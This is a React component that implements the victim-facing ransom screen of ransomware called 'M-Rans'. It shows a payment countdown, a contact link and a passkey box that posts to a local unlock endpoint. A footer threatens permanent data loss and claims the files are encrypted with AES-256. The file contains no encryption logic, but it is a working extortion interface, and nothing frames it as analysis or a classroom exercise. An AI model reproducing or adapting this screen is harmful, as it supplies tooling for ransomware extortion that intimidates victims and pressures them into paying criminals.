import React, { useState, useEffect, useRef } from 'react';
import './App.css';
import mImage from './photos/m.png';
import { Howl } from 'howler';
import soundFile from './sound/s3.sound-clip.mp3';

const App = () => {

  const soundRef = useRef(null);
  const [isUserInteracted, setIsUserInteracted] = useState(false);

  useEffect(() => {
    soundRef.current = new Howl({
      src: [soundFile],
      html5: true,
      volume: 1,
      onload: () => {
        if (isUserInteracted) {
          soundRef.current.play();
        }
      }
    });

    const handleFirstInteraction = () => {
      setIsUserInteracted(true);
      if (soundRef.current && !soundRef.current.playing()) {
        soundRef.current.play();
      }
      document.removeEventListener('click', handleFirstInteraction);
    };

    document.addEventListener('click', handleFirstInteraction);

    return () => {
      if (soundRef.current) {
        soundRef.current.unload();
      }
      document.removeEventListener('click', handleFirstInteraction);
    };
  }, [isUserInteracted]);

  const [timeLeft, setTimeLeft] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });
  const targetDate = new Date("April 6, 2025").getTime();

  useEffect(() => {

    const timer = setInterval(() => {
      const now = new Date();
      const difference = targetDate - now;

      if (difference <= 0) {
        clearInterval(timer);
        setTimeLeft({ days: 0, hours: 0, minutes: 0, seconds: 0 });
        return;
      }

      const days = Math.floor(difference / (1000 * 60 * 60 * 24));
      const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((difference % (1000 * 60)) / 1000);

      setTimeLeft({ days, hours, minutes, seconds });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const send = async (string) => {
    const url = 'http://localhost:1401/api/post/pass';
    const data = new URLSearchParams();
    data.append('key', string);

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: data
      });
      const responseData = await response.json();
      console.log(responseData);
    } catch (error) {
      console.error('Error during POST request:', error);
    }
  };

  return (
    <div className="flex flex-col justify-center items-center min-h-screen p-4 relative pb-[120px] md:pb-[100px]">
      <div className="flex flex-col items-center max-w-6xl w-full">
        <img src={mImage} alt="m-rans" className="w-[100px] md:w-[150px] mb-8" />
        
        <p className="text-2xl md:text-4xl text-center text-white mb-8 px-4">
          <span className="text-3xl md:text-5xl animate-pulse">● </span>
          <span>
            M-Rans : You are under ransomware attack <br className="hidden md:block" />
            <span className="block md:inline mt-2 md:mt-0">
              Time left to pay : {timeLeft.days}d : {timeLeft.hours}h : {timeLeft.minutes}m : {timeLeft.seconds}s
            </span>
          </span>
        </p>

        <div className="flex flex-col space-y-4 md:space-y-6 w-full max-w-md">
          <div className="flex flex-col md:flex-row items-center gap-4 md:gap-6 w-full">
            <span className="w-full md:w-1/2 text-base md:text-lg text-white text-center md:text-left">
              1. You Should Contact With Us First
            </span>
            <button 
              onClick={() => window.open('https://h1ack.me', '_blank')}
              className="w-full md:w-1/2 bg-white text-black text-base md:text-lg font-bold px-4 py-2 rounded-md shadow-lg hover:scale-105 transition-transform"
            >
              Contact M-Rans
            </button>
          </div>

          <div className="flex flex-col md:flex-row items-center gap-4 md:gap-6 w-full">
            <label className="w-full md:w-1/2 text-base md:text-lg text-white text-center md:text-left">
              2. Enter Your PassKey
            </label>
            <input 
              type="text" 
              id="input"
              className="w-full md:w-1/2 bg-white text-black text-base md:text-lg px-4 py-2 rounded-md shadow-lg"
              placeholder="PassKey ..." 
            />
          </div>

          <div className="flex flex-col md:flex-row items-center gap-4 md:gap-6 w-full">
            <span className="w-full md:w-1/2 text-base md:text-lg text-white text-center md:text-left">
              3. Unlock Your PC
            </span>
            <button 
              onClick={() => send(document.getElementById('input').value)}
              className="w-full md:w-1/2 bg-white text-black text-base md:text-lg font-bold px-4 py-2 rounded-md shadow-lg hover:scale-105 transition-transform"
            >
              Unlock
            </button>
          </div>
        </div>

        <div className="fixed bottom-0 left-0 right-0 backdrop-blur-sm py-4 px-4">
          <div className="text-center text-gray-300 text-xs md:text-sm max-w-2xl mx-auto">
            <p className="leading-tight md:leading-normal">
              Warning: Attempting to remove this software without payment will result in permanent data loss 
              ,All your files have been encrypted with military-grade AES-256 encryption
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;